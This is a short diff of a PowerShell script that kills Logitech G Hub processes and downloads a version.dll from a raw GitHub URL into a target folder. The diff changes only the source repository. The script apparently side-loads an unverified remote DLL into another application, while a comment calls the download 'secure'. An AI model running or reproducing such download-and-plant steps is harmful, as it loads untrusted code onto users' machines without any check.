@@ -56,7 +56,8 @@ Stop-Process -Name "lghub*" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 2
 
 # Download and install the file securely from your new repository
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/heaven328x-stack/Files/main/version.dll" -OutFile $dest -ErrorAction Stop
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/X-LIFE-STORE/Files/main/version.dll" -OutFile $dest -ErrorAction Stop
+
 
 Write-Host "Done. Installed to: $dest" -ForegroundColor Green
 Pause
